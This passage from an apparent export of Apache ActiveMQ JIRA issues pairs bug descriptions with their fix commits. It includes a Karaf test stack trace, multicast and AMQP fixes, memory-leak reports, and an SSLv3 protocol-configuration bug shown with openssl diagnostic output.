	at org.apache.felix.gogo.runtime.CommandProxy.execute(CommandProxy.java:78)
	at org.apache.felix.gogo.runtime.Closure.executeCmd(Closure.java:477)
	at org.apache.felix.gogo.runtime.Closure.executeStatement(Closure.java:403)
	at org.apache.felix.gogo.runtime.Pipe.run(Pipe.java:108)
	at org.apache.felix.gogo.runtime.Closure.execute(Closure.java:183)
	at org.apache.felix.gogo.runtime.Closure.execute(Closure.java:120)
	at org.apache.felix.gogo.runtime.CommandSessionImpl.execute(CommandSessionImpl.java:92)
	at org.apache.activemq.karaf.itest.AbstractFeatureTest$1$1.run(AbstractFeatureTest.java:125)
	at org.apache.activemq.karaf.itest.AbstractFeatureTest$1$1.run(AbstractFeatureTest.java:117)
	at java.security.AccessController.doPrivileged(Native Method)
	at javax.security.auth.Subject.doAs(Subject.java:356)
	at org.apache.activemq.karaf.itest.AbstractFeatureTest$1.call(AbstractFeatureTest.java:117)
	at org.apache.activemq.karaf.itest.AbstractFeatureTest$1.call(AbstractFeatureTest.java:109)
	at java.util.concurrent.FutureTask.run(FutureTask.java:262)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)
	at java.util.concurrent.FutureTask.run(FutureTask.java:262)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.Exception: Unable to convert value 1421674680492 to type java.lang.String
	at org.apache.aries.blueprint.container.AggregateConverter.convert(AggregateConverter.java:184)
	at org.apache.aries.blueprint.container.AggregateConverter.convertToCollection(AggregateConverter.java:340)
	... 30 more
2015-01-19 13:38:07,390 | ERROR | Thread-30        | AbstractFeatureTest              | 125 - PAXEXAM-PROBE-a407b767-4b95-4f93-8124-64d04dc65582 - 0.0.0 | Execute: activemq:browse --amqurl tcp://localhost:61616 --user karaf --password karaf -Vbody 1421674680492 - Response:
activemq:browse --amqurl tcp://localhost:61616 --user karaf --password karaf -Vbody 1421674680492
java.lang.Exception: Unable to convert from [--amqurl, tcp://localhost:61616, --user, karaf, --password, karaf, -Vbody, 1421674680492] to java.util.ArrayList<java.lang.String>(error converting collection entry)
	at org.apache.aries.blueprint.container.AggregateConverter.convertToCollection(AggregateConverter.java:342)
	at org.apache.aries.blueprint.container.AggregateConverter.convert(AggregateConverter.java:182)
	at org.apache.activemq.karaf.commands.ActiveMQCommand$ActiveMQActionPreparator.convert(ActiveMQCommand.java:143)
	at org.apache.activemq.karaf.commands.ActiveMQCommand$ActiveMQActionPreparator.prepare(ActiveMQCommand.java:134)
	at org.apache.felix.gogo.commands.basic.AbstractCommand.execute(AbstractCommand.java:34)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:606)
	at org.apache.aries.proxy.impl.ProxyHandler$1.invoke(ProxyHandler.java:54)
	at org.apache.aries.proxy.impl.ProxyHandler.invoke(ProxyHandler.java:119)
	at org.apache.activemq.karaf.commands.$ActiveMQCommand695030723.execute(Unknown Source)
	at org.apache.felix.gogo.runtime.CommandProxy.execute(CommandProxy.java:78)
	at org.apache.felix.gogo.runtime.Closure.executeCmd(Closure.java:477)
	at org.apache.felix.gogo.runtime.Closure.executeStatement(Closure.java:403)
	at org.apache.felix.gogo.runtime.Pipe.run(Pipe.java:108)
	at org.apache.felix.gogo.runtime.Closure.execute(Closure.java:183)
	at org.apache.felix.gogo.runtime.Closure.execute(Closure.java:120)
	at org.apache.felix.gogo.runtime.CommandSessionImpl.execute(CommandSessionImpl.java:92)
	at org.apache.activemq.karaf.itest.AbstractFeatureTest$1$1.run(AbstractFeatureTest.java:125)
	at org.apache.activemq.karaf.itest.AbstractFeatureTest$1$1.run(AbstractFeatureTest.java:117)
	at java.security.AccessController.doPrivileged(Native Method)
	at javax.security.auth.Subject.doAs(Subject.java:356)
	at org.apache.activemq.karaf.itest.AbstractFeatureTest$1.call(AbstractFeatureTest.java:117)
	at org.apache.activemq.karaf.itest.AbstractFeatureTest$1.call(AbstractFeatureTest.java:109)
	at java.util.concurrent.FutureTask.run(FutureTask.java:262)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)
	at java.util.concurrent.FutureTask.run(FutureTask.java:262)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.Exception: Unable to convert value 1421674680492 to type java.lang.String
	at org.apache.aries.blueprint.container.AggregateConverter.convert(AggregateConverter.java:184)
	at org.apache.aries.blueprint.container.AggregateConverter.convertToCollection(AggregateConverter.java:340)
	... 30 more
2015-01-19 13:38:08,400 | ERROR | Thread-30        | AbstractFeatureTest              | 125 - PAXEXAM-PROBE-a407b767-4b95-4f93-8124-64d04dc65582 - 0.0.0 | Execute: activemq:browse --amqurl tcp://localhost:61616 --user karaf --password karaf -Vbody 1421674680492 - Response:
activemq:browse --amqurl tcp://localhost:61616 --user karaf --password karaf -Vbody 1421674680492
java.lang.Exception: Unable to convert from [--amqurl, tcp://localhost:61616, --user, karaf, --password, karaf, -Vbody, 1421674680492] to java.util.ArrayList<java.lang.String>(error converting collection entry)
	at org.apache.aries.blueprint.container.AggregateConverter.convertToCollection(AggregateConverter.java:342)
	at org.apache.aries.blueprint.container.AggregateConverter.convert(AggregateConverter.java:182)
	at org.apache.activemq.karaf.commands.ActiveMQCommand$ActiveMQActionPreparator.convert(ActiveMQCommand.java:143)
	at org.apache.activemq.karaf.commands.ActiveMQCommand$ActiveMQActionPreparator.prepare(ActiveMQCommand.java:134)
	at org.apache.felix.gogo.commands.basic.AbstractCommand.execute(AbstractCommand.java:34)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:606)
	at org.apache.aries.proxy.impl.ProxyHandler$1.invoke(ProxyHandler.java:54)
	at org.apache.aries.proxy.impl.ProxyHandler.invoke(ProxyHandler.java:119)
	at org.apache.activemq.karaf.commands.$ActiveMQCommand695030723.execute(Unknown Source)
	at org.apache.felix.gogo.runtime.CommandProxy.execute(CommandProxy.java:78)
	at org.apache.felix.gogo.runtime.Closure.executeCmd(Closure.java:477)
	at org.apache.felix.gogo.runtime.Closure.executeStatement(Closure.java:403)
	at org.apache.felix.gogo.runtime.Pipe.run(Pipe.java:108)
	at org.apache.felix.gogo.runtime.Closure.execute(Closure.java:183)
	at org.apache.felix.gogo.runtime.Closure.execute(Closure.java:120)
	at org.apache.felix.gogo.runtime.CommandSessionImpl.execute(CommandSessionImpl.java:92)
	at org.apache.activemq.karaf.itest.AbstractFeatureTest$1$1.run(AbstractFeatureTest.java:125)
	at org.apache.activemq.karaf.itest.AbstractFeatureTest$1$1.run(AbstractFeatureTest.java:117)
	at java.security.AccessController.doPrivileged(Native Method)
	at javax.security.auth.Subject.doAs(Subject.java:356)
	at org.apache.activemq.karaf.itest.AbstractFeatureTest$1.call(AbstractFeatureTest.java:117)
	at org.apache.activemq.karaf.itest.AbstractFeatureTest$1.call(AbstractFeatureTest.java:109)
	at java.util.concurrent.FutureTask.run(FutureTask.java:262)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)
	at java.util.concurrent.FutureTask.run(FutureTask.java:262)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
	at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.Exception: Unable to convert value 1421674680492 to type java.lang.String
	at org.apache.aries.blueprint.container.AggregateConverter.convert(AggregateConverter.java:184)
	at org.apache.aries.blueprint.container.AggregateConverter.convertToCollection(AggregateConverter.java:340){code}",548aa1e41557f00f894fe160219bd155464f6c06,"https://issues.apache.org/jira/browse/AMQ-5525 - worked around the issue with blueprint converter - all. All of the activemq commands have the same single arg signature, so the conversion should be trivial, doing the conversion inline in the default case"
12767517,AMQ-5520,"
If no network interface is explicitly set, it calls mcast.joinGroup(inetAddress); without setting one on the MulticastSocket.  In that case, MulticastSocket then calls NetworkInterface.getDefault().    The ""default"" interface on a system is relatively unpredictable and COULD result in a network interface that isn't even multicast enabled.     On my mac, it's selecting a ""awdl0"" interface which doesn't support multicast.   If I have Parallels running, it sometimes picks up one of those interfaces.   It also sometimes picks up an ipv6 only network interface which also doesn't support the ipv4 broadcast address.

It would be better to enumerate the network interfaces and at least make sure we grab one that support multicast on ipv4 and is ""up"".

Note:  this causes some test failures on my machine.  Specifically SpringTest.testSenderWithSpringXmlEmbeddedPooledBrokerConfiguredViaXml fails.",f4eade2bb3bb83131f17d2768d2218770f0123d3,[AMQ-5520] Use a network interface that actually supports multicast and is up
12767495,AMQ-5519,"When attempting to unregister a DurableSubscription that does not exist via AMQP, the broker currently returns the ""amqp:internal-error"" condition when closing the link. Using the ""amqp:not-found"" condition would be more appropriate.",6466ae2bcfa8831d79f71e94709b0511dc1367cf,"AMQ-5519: use the NOT_FOUND error condition when failing to find a DurableSubscription

https://issues.apache.org/jira/browse/AMQ-5519"
12766507,AMQ-5514,Minor updates for the 5.10.1 release are included here.,3e007d89a27f4c74d33862b9967676c683faec51,[AMQ-5514] Add the 5.10.1 release to the spring.schemas file.
12761103,AMQ-5484,On close of sender links we do not clean up all the mappings for the ConsumerContext instances which leads a build up of context objects in the subscriptions map.,9bd070a8f6337a3452a8529a0647970cc8c6deae,"https://issues.apache.org/jira/browse/AMQ-5484

Ensure that the subscriptionByConsumerId map gets cleaned up when a
sender is closed."
12757695,AMQ-5457,"With a prefetch smaller than queue depth a browse of delivered and unconsumed messages will loos message order. The prefetched messages appearing after the rest of the messages in the queue. The dispatch order is preserved, but the JMX destination view browse list order is incorrect.

Sending 100 messages, consuming 5 with prefetch 10 and closing the consumer. A subsequent QueueView.browse 
Expect [5,6,...100] but get [20,21...100,5,6...]",74f530a6410522df76e842a3f2498a3442db5281,https://issues.apache.org/jira/browse/AMQ-5457 - fix and test - we now peek first in redeliveredWaitingDispatch
12756913,AMQ-5447,"After shutdown embeded activemq broker with JDBC store, 2 'ActiveMQ JDBC PA Scheduled Task' is still alive.
Because the 2 thread's Thread factory is object of JDBCPersistenceAdapter's inner class, so the object of JDBCPersistenceAdapter can be reached from the 2 threads, JDBCPersistenceAdapter has a field point to BrokerService. So the instance of BrokerService can be reached from the 2 threads.

So the stopped brokerService cannot be GC.

The root cause is that when stopping JDBCPersistenceAdapter, only cancelling cleanupTicket without shutdown clockDaemon, that's why the 2 threads are still alive.

According to http://activemq.apache.org/how-do-i-restart-embedded-broker.html, it's better (more reliable) to instantiate the broker again instead of reuse old broker. So if I restart embeded broker, there will be  1 more BrokerService in memory. I think it's memory leak.",51566104abd46722c73d71534e7576b5377d799c,"https://issues.apache.org/jira/browse/AMQ-5447

shutdown the scheduled executer so that any scheduled tasks are canceled
and removed on stop."
12751349,AMQ-5417,"TaskRunnerFactory's default executor is initialised when the first task is executed. It's also given the ThreadFactory object, which is used to create threads for the thread pool. The issue with this is when the first task is initiated from the vm transport in osgi environment, we can have transport connector threads for other transport executed in the wrong classpath. This could lead to various problems afterwards. There needs to be a way to provide the desired classloader for those threads",dffccb1c7dc8e4b4a6282fd5056dfd854d2d2a9b,https://issues.apache.org/jira/browse/AMQ-5417 - use proper classloader in TaskRunnerFactory
12750445,AMQ-5413,"Using Apache Qpid test clients qpid-send and qpid-receive ActiveMQ broker behaves differently from qpidd and I'm wondering if the difference is important.

The test code command lines are:
{noformat}
qpid-send -a ""chuck; {create:always}"" --connection-options {protocol:amqp1.0} --sequence yes --content-string 0
qpid-receive -a chuck -m 1 --connection-options ""{protocol:amqp1.0}"" --print-headers yes
{noformat}

When I run the tests against qpidd they send one message and receive one message every time. However against ActiveMQ 5.11 the qpid-receive does not receive the message until one of several conditions:
* the qpid-receive command also includes ""--timeout 1""
* the qpid-receive command is repeated several, possibly dozens, of times.

When qpidd broker is running or when activemq is running and --timeout is specified then the qpid-receive output is:
{noformat}
chug@FJELD ~> qpid-receive -a chuck -m 1 --connection-options ""{protocol:amqp1.0}"" --print-headers yes
Properties: {sn:1, ts:1414177685195174548, x-amqp-first-acquirer:True}

0
{noformat}

However, activemq running the client twice without the timeout and once with the timeout looks like this:
{noformat}
chug@FJELD ~> qpid-receive -a chuck -m 1 --connection-options ""{protocol:amqp1.0}"" --print-headers yes
chug@FJELD ~> qpid-receive -a chuck -m 1 --connection-options ""{protocol:amqp1.0}"" --print-headers yes
chug@FJELD ~> qpid-receive -a chuck -m 1 --connection-options ""{protocol:amqp1.0}"" --print-headers yes --timeout 1
Redelivered: true
Properties: {sn:1, ts:1414178091185765136, x-amqp-delivery-count:1}

0
{noformat}

The false receive attempts make the message look like it was already delivered, hence the Redelivered: true, first-acquirer absent and the x-amqp-delivery-count setting.

Views of the protocol interactions between the brokers and clients are here:
http://people.apache.org/~chug/adverb_qpid_send_receive_1/

I ran the tests twice on ActiveMQ with the tcpnodelay option turned on and off but that didn't seem to make any difference.",5e7b70f11fb53cb1a0a00edc5e61faf90bbdce78,"https://issues.apache.org/jira/browse/AMQ-5413

ensure drain completion clear currently tracked credit value, next flow
should update to the correct value."
12749889,AMQ-5407,"If you are using nio+ssl and try to set specific protocols (i.e. TLS and not SSLv3) for openwire and or stomp with ssl, NIO will ignore those settings and allow SSLv3 anyway.

Setting specific transport protocols for activemq in my activemq.xml file:

{noformat}
<transportConnectors>
<transportConnector name=""openwire"" uri=""nio+ssl://0.0.0.0:61616?transport.enabledProtocols=TLSv1,TLSv1.1,TLSv1.2"">
</transportConnector>
<transportConnector name=""stomp+ssl"" uri=""stomp+nio+ssl://0.0.0.0:61613?transport.enabledProtocols=TLSv1,TLSv1.1,TLSv1.2"">
</transportConnector>
{noformat}

After changing this, I restarted activemq to ensure that those protocols were set correctly.

With this setting in activemq.xml, activemq should not be able to do a successful SSLv3 handshake, however using s_connect with openssl, I am able to get activemq to respond with SSLv3:

{noformat}
###########
# command run: openssl s_client -ssl3 -connect hostname.com:61616
###########

###########
# this is what should be displayed
###########
CONNECTED(00000003)
139975367284552:error:14094410:SSL routines:SSL3_READ_BYTES:sslv3 alert handshake failure:s3_pkt.c:1256:SSL alert number 40
139975367284552:error:1409E0E5:SSL routines:SSL3_WRITE_BYTES:ssl handshake failure:s3_pkt.c:596:
---
no peer certificate available
---
No client certificate CA names sent
---
SSL handshake has read 7 bytes and written 0 bytes
---
New, (NONE), Cipher is (NONE)
Secure Renegotiation IS NOT supported
Compression: NONE
Expansion: NONE
SSL-Session:
    Protocol  : SSLv3
    Cipher    : 0000
    Session-ID:
    Session-ID-ctx:
    Master-Key:
    Key-Arg   : None
    Krb5 Principal: None
    PSK identity: None
    PSK identity hint: None
    Start Time: 1414003656
    Timeout   : 7200 (sec)
    Verify return code: 0 (ok)
---
###########
# this is what is actually shown
###########


CONNECTED(00000003)
depth=0 CN = puppetmaster.local
verify error:num=20:unable to get local issuer certificate
verify return:1
depth=0 CN = puppetmaster.local
verify error:num=27:certificate not trusted
verify return:1
depth=0 CN = puppetmaster.local
verify error:num=21:unable to verify the first certificate
verify return:1
---
Certificate chain
 0 s:/CN=puppetmaster.local
   i:/CN=Puppet CA generated on puppetmaster.local at 2014-10-22 11:20:52 -0700
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIFyzCCA7OgAwIBAgIBAjANBgkqhkiG9w0BAQsFADBRMU8wTQYDVQQDDEZQdXBw
ZXQgQ0EgZ2VuZXJhdGVkIG9uIHB1cHBldG1hc3Rlci5sb2NhbCBhdCAyMDE0LTEw
LTIyIDExOjIwOjUyIC0wNzAwMB4XDTE0MTAyMTE4MjA1N1oXDTE5MTAyMTE4MjA1
N1owHTEbMBkGA1UEAwwScHVwcGV0bWFzdGVyLmxvY2FsMIICIjANBgkqhkiG9w0B
AQEFAAOCAg8AMIICCgKCAgEAyehXPWPLEuNkvvl0PHbz5cIbg4i7v51P0FzYfxR7
sUt4455c4htfVpvEmWc1Ef5HD2MFViIAHorDMeGzNY2kAaX6xK2JVNhi8m8EJF7L
C0LncN59p/DIc5XBl6fFGu8FGaEZ1wvRSOyitcsWCk5Gk8Oi8w56/xV7WVJJ1Lch
PV62TZbKqDT8Ah/VcfIaCCWVCAB59/kIIGPJ8eI3aLdQv3f5h89ETiTr4yLtd1xm
z25qqPV2JZIh1yAGBCjBGsE6L41eyckZy9Tl1JZaDTRfOiXK6SkaK8NTNNbuXeQT
GkLusxpUL+FmisiH1ikazKZkyRuA0vMyQiakgUleVtACt4x+oLJ9askf5nx36wGu
HcU5kaIuy2d8cLq2CD+FKLOdH10+KiMlxCtHny4pY15LIzs3F1wjqoeLwpcoQwoM
57Qnef8UNV0sQGlp/HkSxnhDwXh5mrXGLkpi11glTx4CIs7Yz8s7yC1FCvw8/wAi
3oDrmSAgidZXKd0MT+PT+4PTDHbC+p2TG6noX+GnrAjhKFKWyw31ue9pUMX/X2Az
ExXiLFw2+zH+YsMNvHdTq4BM7G3s0tgQD3UQkWkDPk+0R3X14WDFTGUZ7oEb6Q+o
/R+SE8W/rEwRw/O2tE6Xq063DyB4EYI+bVojpwtqOwyCNkbbC5aNnraUWfuXMWJB
oqECAwEAAaOB4TCB3jA1BglghkgBhvhCAQ0EKFB1cHBldCBSdWJ5L09wZW5TU0wg
SW50ZXJuYWwgQ2VydGlmaWNhdGUwJQYDVR0RBB4wHIIGcHVwcGV0ghJwdXBwZXRt
YXN0ZXIubG9jYWwwDgYDVR0PAQH/BAQDAgWgMCAGA1UdJQEB/wQWMBQGCCsGAQUF
BwMBBggrBgEFBQcDAjAMBgNVHRMBAf8EAjAAMB0GA1UdDgQWBBQSS72jRveOqBkQ
TbLxTT2j5DWLPDAfBgNVHSMEGDAWgBRKtJ+dt+VxU6IwhHMYMAY78E7BOTANBgkq
hkiG9w0BAQsFAAOCAgEATFMfxi1jFbnvTxiArZrL0RsA2mgBoU3p6gYhthmBWfzz
7OscRacWx7CvBXGdKi3oc2uyNVIsazS30Yw5vcfoTqUAT9TdsDLMf10h9AYp15ut
K1ebZUc9OIf00+zF/IT/+CFXM9eKzgBxs6fKUKCKngI+kDYRD+h5qmAhUCeAAR9B
+3kb8UV064Nlmla+x4zOZBzb+VSMWKSet/Sv4pMHusX2+ICvy0cRwwKmaVTzQVDS
uTNlElYUM0xRXb10tS95j4S7MSYkKu2VHLD5F5LB8KxjhCcorwa323DnCQkywJLQ
3S1UUH3recjoLeD9Huj8+EL7uEvQdloRPbS/2cWFKkJgXYc5t7yC7Dp8qKNzTuNy
COp68xunNPHh/JcS3wo4F/H7t2ve5IFnca4H/kSvLQWOQzmLfOrNhkn6ZJkqqGMo
zf2LHVvJpfAUV6ezR1O0i70GR3YkNIijok14WMinDOXN98VLMp0j9zWm5aBF5Chg
zRFIvrvz/NbwMtawZ/QD/B+kOolfKCNku9xkQ6wrHj6GikH4GYwWzfTZmpaOE4GC
Dm8Axn5Ax+psLO10N4xwSxeB/zzygD4wDsQxP0kRg6lFIVQgfKmaJA07IcotCL9p
M4ugQDGnWAjzBRqbvh5x37dc15C8F3fluSxC4yq5jv0EVeXooZISigG6Sr3rhpE=
-----END CERTIFICATE-----
subject=/CN=puppetmaster.local
issuer=/CN=Puppet CA generated on puppetmaster.local at 2014-10-22 11:20:52 -0700
---
No client certificate CA names sent
---
SSL handshake has read 2474 bytes and written 322 bytes
---
New, TLSv1/SSLv3, Cipher is DHE-RSA-AES256-SHA
Server public key is 4096 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
SSL-Session:
    Protocol  : SSLv3
    Cipher    : DHE-RSA-AES256-SHA
    Session-ID: 5447F9BA158D679AE17BAD85A384B43C5B1EE597F7F0AAC01418156FC9E08924
    Session-ID-ctx:
    Master-Key: 96B8081CB3EC675CF2CDD0546435760871491908C10E36E8ECA622155FFE4CAA0F851DC95F63C2C476727EDC985B2DD7
    Key-Arg   : None
    Krb5 Principal: None
    PSK identity: None
    PSK identity hint: None
    Start Time: 1414003130
    Timeout   : 7200 (sec)
    Verify return code: 21 (unable to verify the first certificate)
---
�ActiveMQ
�
        MaxFrameSize�������  CacheSize
                                         CacheEnabledSizePrefixDisabled MaxInactivityDurationInitalDelay'TcpNoDelayEnabledMaxInactivityDurationu0TightEncodingEnabledStackTraceEnabled
{noformat}

Removing nio from both the stomp and openwire transport connector settings (and restarting activemq) actually removes the ability to talk over SSLv3 using the technique I posted before, however putting nio back in ignores those transport connector settings and allows SSLv3.",1948fe41a35d895589dfd14d85aee75078a8415b,"https://issues.apache.org/jira/browse/AMQ-5407

Allow config of enabled protocols for nio+ssl and stomp+nio+ssl etc to
match the capability of the non-nio transports."
12749461,AMQ-5404,"During numerous test runs we've seen the file system fill up (df -k) and eventually ActiveMQ failing with a short write error.  When ActiveMQ falls over the file system is freed up to its original state. 

Before ActiveMQ falls over we've tried to find the reason for the file system filling up by hunting through the directories but to no avail.  However when we do a lsof -a +L1 we can see numerous deleted LevelDB log and index files.   

Does anybody know why ActiveMQ/LevelDB is not releasing these files for full clear up by the OS. 

This is on 
Red Hat Linux 6.4 
ActiveMQ 5.10 
Java 1.7.0_45 ",9de3fff1f5c7741e8b22d821aadc4225cd3500a4,Fixes AMQ-5404: LevelDB files not being released after deletion
12732737,AMQ-5315,"We have seen the following NPE setting up a demand forwarding bridge
{code}
java.lang.NullPointerException: null
	at org.apache.activemq.network.DemandForwardingBridgeSupport.collectBrokerInfos(DemandForwardingBridgeSupport.java:365) [activemq-broker-5.10.0.jar:5.10.0]
	at org.apache.activemq.network.DemandForwardingBridgeSupport.access$400(DemandForwardingBridgeSupport.java:105) [activemq-broker-5.10.0.jar:5.10.0]
	at org.apache.activemq.network.DemandForwardingBridgeSupport$5.run(DemandForwardingBridgeSupport.java:331) [activemq-broker-5.10.0.jar:5.10.0]
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145) [na:1.7.0_60]
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) [na:1.7.0_60]
	at java.lang.Thread.run(Thread.java:745) [na:1.7.0_60]
{code}

This occurred in one of our tests but only under load so seems to be a race condition of some sort.
",c391321d1b5b59542d847717654b0d4dba54cf2f,"https://issues.apache.org/jira/browse/AMQ-5315

Fix for potential NPE on transport error."
12731312,AMQ-5304,"When configuring the authorization plugin with a <tempDestinationAuthorizationEntry> that also set a groupClass, this groupClass is not properly applied to the TempDestinationAuthorizationEntry instance. 

E.g. consider this example config
{code:xml}
      <authorizationPlugin>
        <map>
          <authorizationMap groupClass=""org.apache.karaf.jaas.boot.principal.RolePrincipal"">
            <authorizationEntries>
              <authorizationEntry queue="">"" read=""admin"" write=""client,admin"" admin=""client,admin"" />
              <authorizationEntry topic="">"" read=""client,admin"" write=""admin"" admin=""admin""/>
              <authorizationEntry topic=""ActiveMQ.Advisory.>"" read=""admin,client"" write=""admin,client"" admin=""admin""/>
           </authorizationEntries>

           <tempDestinationAuthorizationEntry>
             <tempDestinationAuthorizationEntry read=""client,admin"" write=""client,admin"" admin=""client,admin"" groupClass=""org.apache.karaf.jaas.boot.principal.RolePrincipal""/>
           </tempDestinationAuthorizationEntry>

         </authorizationMap>
        </map>
      </authorizationPlugin>
{code}


The groupClass attribute is set on the TempDestinationAuthorizationEntry instance but we don't apply the groupClass to the AuthorizationEntry by calling afterPropertiesSet();

As a result, authorization fails when trying to create a temp destination. 
This can happen when deploying the broker inside a Karaf container and have Karaf do the authentication (such as in JBoss A-MQ). 
The groupClass is properly set on the authorizationEntries within the <authorizationEntries> list and only fails to be applied properly on the tempDestinationAuthorizationEntry. 



",acf84b43e9b7c8aaf92784569075f00e83cf4809,https://issues.apache.org/jira/browse/AMQ-5304 - providing test case
12731312,AMQ-5304,"When configuring the authorization plugin with a <tempDestinationAuthorizationEntry> that also set a groupClass, this groupClass is not properly applied to the TempDestinationAuthorizationEntry instance. 

E.g. consider this example config
{code:xml}
      <authorizationPlugin>
        <map>
          <authorizationMap groupClass=""org.apache.karaf.jaas.boot.principal.RolePrincipal"">
            <authorizationEntries>
              <authorizationEntry queue="">"" read=""admin"" write=""client,admin"" admin=""client,admin"" />
              <authorizationEntry topic="">"" read=""client,admin"" write=""admin"" admin=""admin""/>
              <authorizationEntry topic=""ActiveMQ.Advisory.>"" read=""admin,client"" write=""admin,client"" admin=""admin""/>
           </authorizationEntries>

           <tempDestinationAuthorizationEntry>
             <tempDestinationAuthorizationEntry read=""client,admin"" write=""client,admin"" admin=""client,admin"" groupClass=""org.apache.karaf.jaas.boot.principal.RolePrincipal""/>
           </tempDestinationAuthorizationEntry>

         </authorizationMap>
        </map>
      </authorizationPlugin>
{code}


The groupClass attribute is set on the TempDestinationAuthorizationEntry instance but we don't apply the groupClass to the AuthorizationEntry by calling afterPropertiesSet();

As a result, authorization fails when trying to create a temp destination. 
This can happen when deploying the broker inside a Karaf container and have Karaf do the authentication (such as in JBoss A-MQ). 
The groupClass is properly set on the authorizationEntries within the <authorizationEntries> list and only fails to be applied properly on the tempDestinationAuthorizationEntry. 



",6bdce73d838abccd8495c979c45bbff8a8bdfc5f,https://issues.apache.org/jira/browse/AMQ-5304 - ignore the test for now
12731312,AMQ-5304,"When configuring the authorization plugin with a <tempDestinationAuthorizationEntry> that also set a groupClass, this groupClass is not properly applied to the TempDestinationAuthorizationEntry instance. 

E.g. consider this example config
{code:xml}
      <authorizationPlugin>
        <map>
          <authorizationMap groupClass=""org.apache.karaf.jaas.boot.principal.RolePrincipal"">
            <authorizationEntries>
              <authorizationEntry queue="">"" read=""admin"" write=""client,admin"" admin=""client,admin"" />
              <authorizationEntry topic="">"" read=""client,admin"" write=""admin"" admin=""admin""/>
              <authorizationEntry topic=""ActiveMQ.Advisory.>"" read=""admin,client"" write=""admin,client"" admin=""admin""/>
           </authorizationEntries>

           <tempDestinationAuthorizationEntry>
             <tempDestinationAuthorizationEntry read=""client,admin"" write=""client,admin"" admin=""client,admin"" groupClass=""org.apache.karaf.jaas.boot.principal.RolePrincipal""/>
           </tempDestinationAuthorizationEntry>

         </authorizationMap>
        </map>
      </authorizationPlugin>
{code}


The groupClass attribute is set on the TempDestinationAuthorizationEntry instance but we don't apply the groupClass to the AuthorizationEntry by calling afterPropertiesSet();

As a result, authorization fails when trying to create a temp destination. 
This can happen when deploying the broker inside a Karaf container and have Karaf do the authentication (such as in JBoss A-MQ). 
The groupClass is properly set on the authorizationEntries within the <authorizationEntries> list and only fails to be applied properly on the tempDestinationAuthorizationEntry. 



",98f707bd1e733821a02e13b6ae0fe9bc8a0ed9b0,https://issues.apache.org/jira/browse/AMQ-5304 - still missing unit test case
12726356,AMQ-5266,"With multiple concurrent producer transactions and active fast consumers it is possible to get out of order db insertions and scans resulting in a skipped dispatch. This scenario is exacerbated when the cursor cache is disabled because every dispatch will potentially result in a scan.
the JDBC store maps jms transaction to jdbc connection transactions at the point of a commit and these can occur in parallel. The broker tracks a sequenceId to ensure ordering relative to a jms connection and  scans respect that order but there is currently nothing to stop a scan seeing a later sequence before an earlier sequence is stored. In other words, inserts can race, but the reader needs to limit a read to the lowest outstanding sequence.

On a restart, any stuck messages will be replayed correctly, because the cursor transient state w.r.t to the last sequence id read will be reset.",428fc82c8cad36fe600a68cffeb3c4161a345a17,AMQ5266Test can take 8mins locally - exclude from quick tests
12726356,AMQ-5266,"With multiple concurrent producer transactions and active fast consumers it is possible to get out of order db insertions and scans resulting in a skipped dispatch. This scenario is exacerbated when the cursor cache is disabled because every dispatch will potentially result in a scan.
the JDBC store maps jms transaction to jdbc connection transactions at the point of a commit and these can occur in parallel. The broker tracks a sequenceId to ensure ordering relative to a jms connection and  scans respect that order but there is currently nothing to stop a scan seeing a later sequence before an earlier sequence is stored. In other words, inserts can race, but the reader needs to limit a read to the lowest outstanding sequence.

On a restart, any stuck messages will be replayed correctly, because the cursor transient state w.r.t to the last sequence id read will be reset.",7c116631b504e31fb0bd9f805b1b77090d16f4ff,AMQ-5266 - fix leak in transaction context - completions were not cleared on close/commit
12720840,AMQ-5223,Adding <packaging>bunde<packaging> fixes the issue,7ceb4d0c8e55364c21e798918eaf1fdb18b95138,"https://issues.apache.org/jira/browse/AMQ-5223

Added the bundle packaging option"
12720635,AMQ-5222,"I enabled deletion of Inactive Queue for POC every 10 seconds
<policyEntry queue="">"" producerFlowControl=""true"" memoryLimit=""20mb""   gcInactiveDestinations=""true"" inactiveTimoutBeforeGC=""10000"">.

Now I start a Consumer Listener process..The Queue is created and then it is deleted though Consumer is still running and Active..I would expect this to should not be deleted as it still has active Queue

Looking @ code BaseDestination->markForGC(long timeStamp) & BaseDestination->canGC() seems to be suspect based on usage from RegionBroker->purgeInactiveDestinations
",6ac3138daff50b8ba0620d31f5b36d83d0316540,"https://issues.apache.org/jira/browse/AMQ-5222

Add test to show this is working as it should."
12711935,AMQ-5167,"Steps to reprodouce: 

1. start Karaf 2.3.5 or 3.0.1. 
2. install activemq feature : 
feature:repo-add activemq 5.9.1 
feature:install activemq-broker 

Stack trace: 

~~~
